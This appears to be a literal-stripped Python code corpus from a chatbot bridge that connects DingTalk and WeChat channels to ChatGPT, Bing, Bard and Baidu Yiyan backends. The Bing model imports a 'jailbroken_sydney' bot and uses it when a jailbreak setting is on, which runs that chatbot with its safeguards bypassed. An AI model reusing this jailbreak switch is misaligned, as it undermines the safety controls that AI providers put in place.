'<STR_LIT>' ] = '<STR_LIT>' <EOL> id = sender_id <EOL> context [ '<STR_LIT>' ] = str ( id ) <EOL> reply = super ( ) . build_reply_content ( prompt , context ) <EOL> return reply <EOL> dd = DingTalkChannel ( ) <EOL> handlers = dict ( ) <EOL> robots = channel_conf ( const . DINGTALK ) . get ( '<STR_LIT>' ) <EOL> if robots and len ( robots ) > <NUM_LIT> : <EOL> for robot in robots : <EOL> robot_config = channel_conf ( const . DINGTALK ) . get ( robot ) <EOL> robot_key = robot_config . get ( '<STR_LIT>' ) <EOL> group_name = robot_config . get ( '<STR_LIT>' ) <EOL> handlers [ group_name or robot_key ] = DingTalkHandler ( robot_config ) <EOL> else : <EOL> handlers [ '<STR_LIT>' ] = DingTalkHandler ( channel_conf ( const . DINGTALK ) ) <EOL> http_app = Flask ( __name__ , ) <EOL> @ http_app . route ( "<STR_LIT>" , methods = [ '<STR_LIT>' ] ) <EOL> def chat ( ) : <EOL> log . info ( "<STR_LIT>" . format ( str ( request . headers ) ) ) <EOL> log . info ( "<STR_LIT>" . format ( str ( request . data ) ) ) <EOL> token = request . headers . get ( '<STR_LIT>' ) <EOL> data = json . loads ( request . data ) <EOL> if data : <EOL> content = data [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> if not content : <EOL> return <EOL> code = data [ '<STR_LIT>' ] <EOL> group_name = None <EOL> if '<STR_LIT>' in data : <EOL> group_name = data [ '<STR_LIT>' ] <EOL> handler = handlers . get ( group_name , handlers . get ( code , handlers . get ( '<STR_LIT>' ) ) ) <EOL> if handler . dingtalk_post_token and token != handler . dingtalk_post_token : <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> handler . chat ( dd , data ) <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> </s>
<s> import werobot <EOL> from config import channel_conf <EOL> from common import const <EOL> from common . log import logger <EOL> from channel . channel import Channel <EOL> from concurrent . futures import ThreadPoolExecutor <EOL> robot = werobot . WeRoBot ( token = channel_conf ( const . WECHAT_MP ) . get ( '<STR_LIT>' ) ) <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> @ robot . text <EOL> def hello_world ( msg ) : <EOL> logger . info ( '<STR_LIT>' . format ( msg . content , msg . source ) ) <EOL> return WechatServiceAccount ( ) . handle ( msg ) <EOL> class WechatServiceAccount ( Channel ) : <EOL> def startup ( self ) : <EOL> logger . info ( '<STR_LIT>' ) <EOL> robot . config [ '<STR_LIT>' ] = channel_conf ( const . WECHAT_MP ) . get ( '<STR_LIT>' ) <EOL> robot . config [ "<STR_LIT>" ] = channel_conf ( const . WECHAT_MP ) . get ( '<STR_LIT>' ) <EOL> robot . config [ "<STR_LIT>" ] = channel_conf ( const . WECHAT_MP ) . get ( '<STR_LIT>' ) <EOL> robot . config [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> robot . run ( ) <EOL> def handle ( self , msg , count = <NUM_LIT> ) : <EOL> context = { } <EOL> context [ '<STR_LIT>' ] = msg . source <EOL> thread_pool . submit ( self . _do_send , msg . content , context ) <EOL> return "<STR_LIT>" <EOL> def _do_send ( self , query , context ) : <EOL> reply_text = super ( ) . build_reply_content ( query , context ) <EOL> logger . info ( '<STR_LIT>' . format ( reply_text ) ) <EOL> client = robot . client <EOL> client . send_text_message ( context [ '<STR_LIT>' ] , reply_text ) <EOL> </s>
<s> import os <EOL> import importlib . util <EOL> from plugins . event import EventAction , EventContext , Event <EOL> from plugins . plugin_registry import PluginRegistry <EOL> from common import functions , log <EOL> @ functions . singleton <EOL> class PluginManager : <EOL> def __init__ ( self , plugins_dir = "<STR_LIT>" ) : <EOL> self . plugins_dir = plugins_dir <EOL> self . plugin_registry = PluginRegistry ( ) <EOL> self . load_plugins ( ) <EOL> def load_plugins ( self ) : <EOL> for plugin_name in self . find_plugin_names ( ) : <EOL> if os . path . exists ( f"<STR_LIT>" ) : <EOL> try : <EOL> plugin_module = self . load_plugin_module ( plugin_name ) <EOL> self . plugin_registry . register_from_module ( plugin_module ) <EOL> except Exception as e : <EOL> log . warn ( "<STR_LIT>" % ( plugin_name ) ) <EOL> def find_plugin_names ( self ) : <EOL> plugin_names = [ ] <EOL> for entry in os . scandir ( self . plugins_dir ) : <EOL> if entry . is_dir ( ) : <EOL> plugin_names . append ( entry . name ) <EOL> return plugin_names <EOL> def load_plugin_module ( self , plugin_name ) : <EOL> spec = importlib . util . spec_from_file_location ( <EOL> plugin_name , os . path . join ( self . plugins_dir , plugin_name , f"<STR_LIT>" ) <EOL> ) <EOL> module = importlib . util . module_from_spec ( spec ) <EOL> spec . loader . exec_module ( module ) <EOL> return module <EOL> def emit_event ( self , e_context : EventContext , * args , ** kwargs ) : <EOL> for plugin in self . plugin_registry . list_plugins ( ) : <EOL> if plugin . enabled and e_context . action == EventAction . CONTINUE : <EOL> if ( e_context . event in plugin . handlers ) : <EOL> plugin . handlers [ e_context . event ] ( e_context , * args , ** kwargs ) <EOL> return e_context <EOL> </s>
<s> from model . model import Model <EOL> from config import model_conf , common_conf_val <EOL> from common import const <EOL> from common import log <EOL> import openai <EOL> import time <EOL> user_session = dict ( ) <EOL> class ChatGPTModel ( Model ) : <EOL> def __init__ ( self ) : <EOL> openai . api_key = model_conf ( const . OPEN_AI ) . get ( '<STR_LIT>' ) <EOL> api_base = model_conf ( const . OPEN_AI ) . get ( '<STR_LIT>' ) <EOL> if api_base : <EOL> openai . api_base = api_base <EOL> proxy = model_conf ( const . OPEN_AI ) . get ( '<STR_LIT>' ) <EOL> if proxy : <EOL> openai . proxy = proxy <EOL> log . info ( "<STR_LIT>" . format ( <EOL> api_base , proxy ) ) <EOL> def reply ( self , query , context = None ) : <EOL> if not context or not context . get ( '<STR_LIT>' ) or context . get ( '<STR_LIT>' ) == '<STR_LIT>' : <EOL> log . info ( "<STR_LIT>" . format ( query ) ) <EOL> from_user_id = context [ '<STR_LIT>' ] <EOL> clear_memory_commands = common_conf_val ( '<STR_LIT>' , [ '<STR_LIT>' ] ) <EOL> if query in clear_memory_commands : <EOL> Session . clear_session ( from_user_id ) <EOL> return '<STR_LIT>' <EOL> new_query = Session . build_session_query ( query , from_user_id ) <EOL> log . debug ( "<STR_LIT>" . format ( new_query ) ) <EOL> reply_content = self . reply_text ( new_query , from_user_id , <NUM_LIT> ) <EOL> return reply_content <EOL> elif context . get ( '<STR_LIT>' , None ) == '<STR_LIT>' : <EOL> return self . create_img ( query , <NUM_LIT> ) <EOL> def reply_text ( self , query , user_id , retry_count = <NUM_LIT> ) : <EOL> try : <EOL> response = openai . ChatCompletion . create ( <EOL> model = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" ) or "<STR_LIT>" , <EOL> messages = query , <EOL> temperature = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) , <EOL> frequency_penalty = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) , <EOL> presence_penalty = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) <EOL> ) <EOL> reply_content = response . choices [ <NUM_LIT> ] [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> used_token = response [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> log . debug ( response ) <EOL> log . info ( "<STR_LIT>" , reply_content ) <EOL> if reply_content : <EOL> Session . save_session ( query , reply_content , user_id , used_token ) <EOL> return response . choices [ <NUM_LIT> ] [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> except openai . error . RateLimitError as e : <EOL> log . warn ( e ) <EOL> if retry_count < <NUM_LIT> : <EOL> time . sleep ( <NUM_LIT> ) <EOL> log . warn ( "<STR_LIT>" . format ( retry_count + <NUM_LIT> ) ) <EOL> return self . reply_text ( query , user_id , retry_count + <NUM_LIT> ) <EOL> else : <EOL> return "<STR_LIT>" <EOL> except openai . error . APIConnectionError as e : <EOL> log . warn ( e ) <EOL> log . warn ( "<STR_LIT>" ) <EOL> return "<STR_LIT>" <EOL> except openai . error . Timeout as e : <EOL> log . warn ( e ) <EOL> log . warn ( "<STR_LIT>" ) <EOL> return "<STR_LIT>" <EOL> except Exception as e : <EOL> log . exception ( e ) <EOL> Session . clear_session ( user_id ) <EOL> return "<STR_LIT>" <EOL> async def reply_text_stream ( self , query , context , retry_count = <NUM_LIT> ) : <EOL> try : <EOL> user_id = context [ '<STR_LIT>' ] <EOL> new_query = Session . build_session_query ( query , user_id ) <EOL> res = openai . ChatCompletion . create ( <EOL> model = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" ) or "<STR_LIT>" , <EOL> messages = new_query , <EOL> temperature = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) , <EOL> frequency_penalty = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) , <EOL> presence_penalty = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) , <EOL> stream = True <EOL> ) <EOL> full_response = "<STR_LIT>" <EOL> for chunk in res : <EOL> log . debug ( chunk ) <EOL> if ( chunk [ "<STR_LIT>" ] [ <NUM_LIT> ] [ "<STR_LIT>" ] == "<STR_LIT>" ) : <EOL> break <EOL> chunk_message = chunk [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] . get ( "<STR_LIT>" ) <EOL> if ( chunk_message ) : <EOL> full_response += chunk_message <EOL> yield False , full_response <EOL> Session . save_session ( query , full_response , user_id ) <EOL> log . info ( "<STR_LIT>" , full_response ) <EOL> yield True , full_response <EOL> except openai . error . RateLimitError as e : <EOL> log . warn ( e ) <EOL> if retry_count < <NUM_LIT> : <EOL> time . sleep ( <NUM_LIT> ) <EOL> log . warn ( "<STR_LIT>" . format ( retry_count + <NUM_LIT> ) ) <EOL> yield True , self . reply_text_stream ( query , user_id , retry_count + <NUM_LIT> ) <EOL> else : <EOL> yield True , "<STR_LIT>" <EOL> except openai . error . APIConnectionError as e : <EOL> log . warn ( e ) <EOL> log . warn ( "<STR_LIT>" ) <EOL> yield True , "<STR_LIT>" <EOL> except openai . error . Timeout as e : <EOL> log . warn ( e ) <EOL> log . warn ( "<STR_LIT>" ) <EOL> yield True , "<STR_LIT>" <EOL> except Exception as e : <EOL> log . exception ( e ) <EOL> Session . clear_session ( user_id ) <EOL> yield True , "<STR_LIT>" <EOL> def create_img ( self , query , retry_count = <NUM_LIT> ) : <EOL> try : <EOL> log . info ( "<STR_LIT>" . format ( query ) ) <EOL> response = openai . Image . create ( <EOL> prompt = query , <EOL> n = <NUM_LIT> , <EOL> size = "<STR_LIT>" <EOL> ) <EOL> image_url = response [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> log . info ( "<STR_LIT>" . format ( image_url ) ) <EOL> return [ image_url ] <EOL> except openai . error . RateLimitError as e : <EOL> log . warn ( e ) <EOL> if retry_count < <NUM_LIT> : <EOL> time . sleep ( <NUM_LIT> ) <EOL> log . warn ( "<STR_LIT>" . format ( retry_count + <NUM_LIT> ) ) <EOL> return self . reply_text ( query , retry_count + <NUM_LIT> ) <EOL> else : <EOL> return "<STR_LIT>" <EOL> except Exception as e : <EOL> log . exception ( e ) <EOL> return None <EOL> class Session ( object ) : <EOL> @ staticmethod <EOL> def build_session_query ( query , user_id ) : <EOL> session = user_session . get ( user_id , [ ] ) <EOL> if len ( session ) == <NUM_LIT> : <EOL> system_prompt = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> system_item = { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : system_prompt } <EOL> session . append ( system_item ) <EOL> user_session [ user_id ] = session <EOL> user_item = { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : query } <EOL> session . append ( user_item ) <EOL> return session <EOL> @ staticmethod <EOL> def save_session ( query , answer , user_id , used_tokens = <NUM_LIT> ) : <EOL> max_tokens = model_conf ( const . OPEN_AI ) . get ( '<STR_LIT>' ) <EOL> max_history_num = model_conf ( const . OPEN_AI ) . get ( '<STR_LIT>' , None ) <EOL> if not max_tokens or max_tokens > <NUM_LIT> : <EOL> max_tokens = <NUM_LIT> <EOL> session = user_session . get ( user_id ) <EOL> if session : <EOL> gpt_item = { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : answer } <EOL> session . append ( gpt_item ) <EOL> if used_tokens > max_tokens and len ( session ) >= <NUM_LIT> : <EOL> session . pop ( <NUM_LIT> ) <EOL> session . pop ( <NUM_LIT> ) <EOL> if max_history_num is not None : <EOL> while len ( session ) > max_history_num * <NUM_LIT> + <NUM_LIT> : <EOL> session . pop ( <NUM_LIT> ) <EOL> session . pop ( <NUM_LIT> ) <EOL> @ staticmethod <EOL> def clear_session ( user_id ) : <EOL> user_session [ user_id ] = [ ] <EOL> </s>
<s> import json <EOL> import random <EOL> import requests <EOL> import re <EOL> class BardBot : <EOL> BARD_URL = "<STR_LIT>" <EOL> BARD_CHAT_URL = ( <EOL> "<STR_LIT>" <EOL> ) <EOL> HEADERS = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> def __init__ ( self , session_id : str ) : <EOL> self . _reqid = random . randrange ( <NUM_LIT> , <NUM_LIT> ) <EOL> self . conversation_id = "<STR_LIT>" <EOL> self . response_id = "<STR_LIT>" <EOL> self . choice_id = "<STR_LIT>" <EOL> self . session = requests . Session ( ) <EOL> self . session . headers = self . HEADERS <EOL> self . session . cookies . set ( "<STR_LIT>" , session_id ) <EOL> self . SNlM0e = self . __get_snlm0e ( ) <EOL> def __get_snlm0e ( self ) -> str : <EOL> resp = self . session . get ( url = self . BARD_URL , timeout = <NUM_LIT> ) <EOL> if resp . status_code != <NUM_LIT> : <EOL> raise Exception ( "<STR_LIT>" ) <EOL> try : <EOL> SNlM0e = re . search ( r"<STR_LIT>" , resp . text ) . group ( <NUM_LIT> ) <EOL> return SNlM0e <EOL> except Exception as e : <EOL> raise Exception ( f"<STR_LIT>" ) <EOL> def ask ( self , message : str ) -> dict [ str , str ] : <EOL> params = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : str ( self . _reqid ) , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> message_struct = [ [ message ] , None , [ self . conversation_id , self . response_id , self . choice_id ] ] <EOL> data = { "<STR_LIT>" : json . dumps ( [ None , json . dumps ( message_struct ) ] ) , "<STR_LIT>" : self . SNlM0e } <EOL> try : <EOL> resp = self . session . post ( self . BARD_CHAT_URL , params = params , data = data ) <EOL> content = json . loads ( resp . content . splitlines ( ) [ <NUM_LIT> ] ) [ <NUM_LIT> ] [ <NUM_LIT> ] <EOL> if not ( content := json . loads ( resp . content . splitlines ( ) [ <NUM_LIT> ] ) [ <NUM_LIT> ] [ <NUM_LIT> ] ) : <EOL> return { "<STR_LIT>" : f"<STR_LIT>" } <EOL> json_data = json . loads ( content ) <EOL> results = { <EOL> "<STR_LIT>" : json_data [ <NUM_LIT> ] [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : json_data [ <NUM_LIT> ] [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : json_data [ <NUM_LIT> ] [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : json_data [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ { "<STR_LIT>" : i [ <NUM_LIT> ] , "<STR_LIT>" : i [ <NUM_LIT> ] } for i in json_data [ <NUM_LIT> ] ] , <EOL> } <EOL> self . conversation_id = results [ '<STR_LIT>' ] <EOL> self . response_id = results [ '<STR_LIT>' ] <EOL> self . choice_id = results [ "<STR_LIT>" ] [ <NUM_LIT> ] [ "<STR_LIT>" ] <EOL> self . _reqid += <NUM_LIT> <EOL> return results <EOL> except Exception as e : <EOL> raise Exception ( f"<STR_LIT>" ) <EOL> </s>
<s> import asyncio <EOL> from model . model import Model <EOL> from config import model_conf_val , common_conf_val <EOL> from common import log <EOL> from EdgeGPT import Chatbot , ConversationStyle <EOL> from ImageGen import ImageGen <EOL> from common import functions <EOL> from model . bing . jailbroken_sydney import SydneyBot <EOL> user_session = dict ( ) <EOL> suggestion_session = dict ( ) <EOL> class BingModel ( Model ) : <EOL> style = ConversationStyle . creative <EOL> bot : Chatbot = None <EOL> cookies : list = None <EOL> def __init__ ( self ) : <EOL> try : <EOL> self . cookies = model_conf_val ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> self . jailbreak = model_conf_val ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> self . bot = SydneyBot ( cookies = self . cookies , options = { } ) if ( <EOL> self . jailbreak ) else Chatbot ( cookies = self . cookies ) <EOL> except Exception as e : <EOL> log . warn ( e ) <EOL> async def reply_text_stream ( self , query : str , context = None ) -> dict : <EOL> async def handle_answer ( final , answer ) : <EOL> if final : <EOL> try : <EOL> reply = self . build_source_attributions ( answer , context ) <EOL> log . info ( "<STR_LIT>" , reply ) <EOL> yield True , reply <EOL> except Exception as e : <EOL> log . warn ( answer ) <EOL> log . warn ( e ) <EOL> await user_session . get ( context [ '<STR_LIT>' ] , None ) . reset ( ) <EOL> yield True , answer <EOL> else : <EOL> try : <EOL> yield False , answer <EOL> except Exception as e : <EOL> log . warn ( answer ) <EOL> log . warn ( e ) <EOL> await user_session . get ( context [ '<STR_LIT>' ] , None ) . reset ( ) <EOL> yield True , answer <EOL> if not context or not context . get ( '<STR_LIT>' ) or context . get ( '<STR_LIT>' ) == '<STR_LIT>' : <EOL> clear_memory_commands = common_conf_val ( <EOL> '<STR_LIT>' , [ '<STR_LIT>' ] ) <EOL> if query in clear_memory_commands : <EOL> user_session [ context [ '<STR_LIT>' ] ] = None <EOL> yield True , '<STR_LIT>' <EOL> bot = user_session . get ( context [ '<STR_LIT>' ] , None ) <EOL> if not bot : <EOL> bot = self . bot <EOL> else : <EOL> query = self . get_quick_ask_query ( query , context ) <EOL> user_session [ context [ '<STR_LIT>' ] ] = bot <EOL> log . info ( "<STR_LIT>" . format ( query ) ) <EOL> if self . jailbreak : <EOL> async for final , answer in bot . ask_stream ( query , conversation_style = self . style , message_id = bot . user_message_id ) : <EOL> async for result in handle_answer ( final , answer ) : <EOL> yield result <EOL> else : <EOL> async for final , answer in bot . ask_stream ( query , conversation_style = self . style ) : <EOL> async for result in handle_answer ( final , answer ) : <EOL> yield result <EOL> def reply ( self , query : str , context = None ) -> tuple [ str , dict ] : <EOL> if not context or not context . get ( '<STR_LIT>' ) or context . get ( '<STR_LIT>' ) == '<STR_LIT>' : <EOL> clear_memory_commands = common_conf_val ( <EOL> '<STR_LIT>' , [ '<STR_LIT>' ] ) <EOL> if query in clear_memory_commands : <EOL> user_session [ context [ '<STR_LIT>' ] ] = None <EOL> return '<STR_LIT>' <EOL> bot = user_session . get ( context [ '<STR_LIT>' ] , None ) <EOL> if ( bot == None ) : <EOL> bot = self . bot <EOL> else : <EOL> query = self . get_quick_ask_query ( query , context ) <EOL> user_session [ context [ '<STR_LIT>' ] ] = bot <EOL> log . info ( "<STR_LIT>" . format ( query ) ) <EOL> if ( self . jailbreak ) : <EOL> task = bot . ask ( query , conversation_style = self . style , <EOL> message_id = bot . user_message_id ) <EOL> else : <EOL> task = bot . ask ( query , conversation_style = self . style ) <EOL> answer = asyncio . run ( task ) <EOL> if isinstance ( answer , str ) : <EOL> return answer <EOL> try : <EOL> reply = answer [ "<STR_LIT>" ] [ "<STR_LIT>" ] [ - <NUM_LIT> ] <EOL> except Exception as e : <EOL> user_session . get ( context [ '<STR_LIT>' ] , None ) . reset ( ) <EOL> log . warn ( answer ) <EOL> return "<STR_LIT>" <EOL> return self . build_source_attributions ( answer , context ) <EOL> elif context . get ( '<STR_LIT>' , None ) == '<STR_LIT>' : <EOL> if functions . contain_chinese ( query ) : <EOL> return "<STR_LIT>" <EOL> return self . create_img ( query ) <EOL> def create_img ( self , query ) : <EOL> try : <EOL> log . info ( "<STR_LIT>" . format ( query ) ) <EOL> cookie_value = self . cookies [ <NUM_LIT> ] [ "<STR_LIT>" ] <EOL> image_generator = ImageGen ( cookie_value ) <EOL> img_list = image_generator . get_images ( query ) <EOL> log . info ( "<STR_LIT>" . format ( img_list ) ) <EOL> return img_list <EOL> except Exception as e : <EOL> log . warn ( e ) <EOL> return "<STR_LIT>" <EOL> def get_quick_ask_query ( self , query , context ) : <EOL> if ( len ( query ) == <NUM_LIT> and query . isdigit ( ) and query != "<STR_LIT>" ) : <EOL> suggestion_dict = suggestion_session [ context [ '<STR_LIT>' ] ] <EOL> if ( suggestion_dict != None ) : <EOL> query = suggestion_dict [ int ( query ) - <NUM_LIT> ] <EOL> if ( query == None ) : <EOL> return "<STR_LIT>" <EOL> else : <EOL> query = "<STR_LIT>" + query <EOL> return query <EOL> def build_source_attributions ( self , answer , context ) : <EOL> reference = "<STR_LIT>" <EOL> reply = answer [ "<STR_LIT>" ] [ "<STR_LIT>" ] [ - <NUM_LIT> ] <EOL> reply_text = reply [ "<STR_LIT>" ] <EOL> if "<STR_LIT>" in reply : <EOL> for i , attribution in enumerate ( reply [ "<STR_LIT>" ] ) : <EOL> display_name = attribution [ "<STR_LIT>" ] <EOL> url = attribution [ "<STR_LIT>" ] <EOL> reference += f"<STR_LIT>" <EOL> if len ( reference ) > <NUM_LIT> : <EOL> reference = "<STR_LIT>" + reference <EOL> suggestion = "<STR_LIT>" <EOL> if "<STR_LIT>" in reply : <EOL> suggestion_dict = dict ( ) <EOL> for i , attribution in enumerate ( reply [ "<STR_LIT>" ] ) : <EOL> suggestion_dict [ i ] = attribution [ "<STR_LIT>" ] <EOL> suggestion += f"<STR_LIT>" <EOL> suggestion_session [ context [ '<STR_LIT>' ] <EOL> ] = suggestion_dict <EOL> if len ( suggestion ) > <NUM_LIT> : <EOL> suggestion = "<STR_LIT>" + suggestion <EOL> throttling = answer [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> throttling_str = "<STR_LIT>" <EOL> if throttling [ "<STR_LIT>" ] == throttling [ "<STR_LIT>" ] : <EOL> user_session . get ( context [ '<STR_LIT>' ] , None ) . reset ( ) <EOL> throttling_str = "<STR_LIT>" <EOL> else : <EOL> throttling_str = f"<STR_LIT>" <EOL> response = f"<STR_LIT>" <EOL> log . info ( "<STR_LIT>" , response ) <EOL> return response <EOL> else : <EOL> user_session . get ( context [ '<STR_LIT>' ] , None ) . reset ( ) <EOL> log . warn ( "<STR_LIT>" , answer ) <EOL> return "<STR_LIT>" <EOL> </s>
<s> from . bard_bot import BardBot <EOL> from config import model_conf_val <EOL> from model . model import Model <EOL> from common import log <EOL> user_session = dict ( ) <EOL> class BardModel ( Model ) : <EOL> bot : BardBot = None <EOL> def __init__ ( self ) : <EOL> try : <EOL> self . cookies = model_conf_val ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> self . bot = BardBot ( self . cookies ) <EOL> except Exception as e : <EOL> log . warn ( e ) <EOL> def reply ( self , query : str , context = None ) -> dict [ str , str ] : <EOL> if not context or not context . get ( '<STR_LIT>' ) or context . get ( '<STR_LIT>' ) == '<STR_LIT>' : <EOL> bot = user_session . get ( context [ '<STR_LIT>' ] , None ) <EOL> if bot is None : <EOL> bot = self . bot <EOL> user_session [ context [ '<STR_LIT>' ] ] = bot <EOL> log . info ( f"<STR_LIT>" ) <EOL> answer = bot . ask ( query ) <EOL> reply = answer [ '<STR_LIT>' ] <EOL> if answer [ '<STR_LIT>' ] : <EOL> reference = [ ( { '<STR_LIT>' : item [ <NUM_LIT> ] , '<STR_LIT>' : item [ <NUM_LIT> ] [ <NUM_LIT> ] if item [ <NUM_LIT> ] [ <NUM_LIT> ] else item [ <NUM_LIT> ] [ <NUM_LIT> ] } ) for item in answer [ '<STR_LIT>' ] [ <NUM_LIT> ] ] <EOL> reference . sort ( key = lambda x : x [ '<STR_LIT>' ] , reverse = True ) <EOL> reply = self . insert_reference ( reply , reference ) <EOL> log . warn ( f"<STR_LIT>" ) <EOL> return reply <EOL> async def reply_text_stream ( self , query : str , context = None ) -> dict : <EOL> reply = self . reply ( query , context ) <EOL> yield True , reply <EOL> def insert_reference ( self , reply : str , reference : list ) -> str : <EOL> refer = '<STR_LIT>' <EOL> length = len ( reference ) <EOL> for i , item in enumerate ( reference ) : <EOL> index = item [ "<STR_LIT>" ] - <NUM_LIT> <EOL> reply = reply [ : index ] + f'<STR_LIT>' + reply [ index : ] <EOL> refer += f'<STR_LIT>' <EOL> refer += '<STR_LIT>' <EOL> return reply + refer <EOL> </s>
<s> import time <EOL> from channel . channel import Channel <EOL> from concurrent . futures import ThreadPoolExecutor <EOL> from common . log import logger <EOL> from config import conf <EOL> from wechatpy . enterprise . crypto import WeChatCrypto <EOL> from wechatpy . enterprise import WeChatClient <EOL> from wechatpy . exceptions import InvalidSignatureException <EOL> from wechatpy . enterprise . exceptions import InvalidCorpIdException <EOL> from wechatpy . enterprise import parse_message <EOL> from flask import Flask , request , abort <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> app = Flask ( __name__ ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> def handler_msg ( ) : <EOL> return WechatEnterpriseChannel ( ) . handle ( ) <EOL> _conf = conf ( ) . get ( "<STR_LIT>" ) . get ( "<STR_LIT>" ) <EOL> class WechatEnterpriseChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> self . CorpId = _conf . get ( '<STR_LIT>' ) <EOL> self . Secret = _conf . get ( '<STR_LIT>' ) <EOL> self . AppId = _conf . get ( '<STR_LIT>' ) <EOL> self . TOKEN = _conf . get ( '<STR_LIT>' ) <EOL> self . EncodingAESKey = _conf . get ( '<STR_LIT>' ) <EOL> self . crypto = WeChatCrypto ( self . TOKEN , self . EncodingAESKey , self . CorpId ) <EOL> self . client = WeChatClient ( self . CorpId , self . Secret , self . AppId ) <EOL> def startup ( self ) : <EOL> app . run ( host = '<STR_LIT>' , port = _conf . get ( '<STR_LIT>' ) ) <EOL> def send ( self , msg , receiver ) : <EOL> n = <NUM_LIT> <EOL> if len ( msg ) < n : <EOL> logger . info ( '<STR_LIT>' . format ( msg , receiver ) ) <EOL> self . client . message . send_text ( self . AppId , receiver , msg ) <EOL> return <EOL> chunks = [ msg [ i : i + n ] for i in range ( <NUM_LIT> , len ( msg ) , n ) ] <EOL> total = len ( chunks ) <EOL> for i , chunk in enumerate ( chunks ) : <EOL> logger . info ( '<STR_LIT>' . format ( msg , chunk , i + <NUM_LIT> , total ) ) <EOL> self . client . message . send_text ( self . AppId , receiver , chunk ) <EOL> time . sleep ( <NUM_LIT> ) <EOL> def _do_send ( self , query , reply_user_id ) : <EOL> try : <EOL> if not query : <EOL> return <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = reply_user_id <EOL> reply_text = super ( ) . build_reply_content ( query , context ) <EOL> if reply_text : <EOL> self . send ( reply_text , reply_user_id ) <EOL> except Exception as e : <EOL> logger . exception ( e ) <EOL> def handle ( self ) : <EOL> query_params = request . args <EOL> signature = query_params . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> timestamp = query_params . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> nonce = query_params . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> if request . method == '<STR_LIT>' : <EOL> echostr = query_params . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> try : <EOL> echostr = self . crypto . check_signature ( signature , timestamp , nonce , echostr ) <EOL> except InvalidSignatureException : <EOL> abort ( <NUM_LIT> ) <EOL> print ( echostr ) <EOL> return echostr <EOL> elif request . method == '<STR_LIT>' : <EOL> try : <EOL> message = self . crypto . decrypt_message ( <EOL> request . data , <EOL> signature , <EOL> timestamp , <EOL> nonce <EOL> ) <EOL> except ( InvalidSignatureException , InvalidCorpIdException ) : <EOL> abort ( <NUM_LIT> ) <EOL> msg = parse_message ( message ) <EOL> if msg . type == '<STR_LIT>' : <EOL> thread_pool . submit ( self . _do_send , msg . content , msg . source ) <EOL> else : <EOL> reply = '<STR_LIT>' <EOL> return '<STR_LIT>' <EOL> </s>
<s> from model . model import Model <EOL> from config import model_conf <EOL> from common import const <EOL> from common . log import logger <EOL> import requests <EOL> import time <EOL> sessions = { } <EOL> class YiyanModel ( Model ) : <EOL> def __init__ ( self ) : <EOL> self . acs_token = model_conf ( const . BAIDU ) . get ( '<STR_LIT>' ) <EOL> self . cookie = model_conf ( const . BAIDU ) . get ( '<STR_LIT>' ) <EOL> self . base_url = '<STR_LIT>' <EOL> def reply ( self , query , context = None ) : <EOL> logger . info ( "<STR_LIT>" . format ( query ) ) <EOL> user_id = context . get ( '<STR_LIT>' ) or context . get ( '<STR_LIT>' ) <EOL> context [ '<STR_LIT>' ] = query <EOL> chat_session_id = sessions . get ( user_id ) <EOL> if not chat_session_id : <EOL> self . new_session ( context ) <EOL> sessions [ user_id ] = context [ '<STR_LIT>' ] <EOL> else : <EOL> context [ '<STR_LIT>' ] = chat_session_id <EOL> flag = self . new_chat ( context ) <EOL> if not flag : <EOL> return "<STR_LIT>" <EOL> context [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> self . query ( context , <NUM_LIT> , <NUM_LIT> ) <EOL> return context [ '<STR_LIT>' ] <EOL> def new_session ( self , context ) : <EOL> data = { <EOL> "<STR_LIT>" : context [ '<STR_LIT>' ] , <EOL> 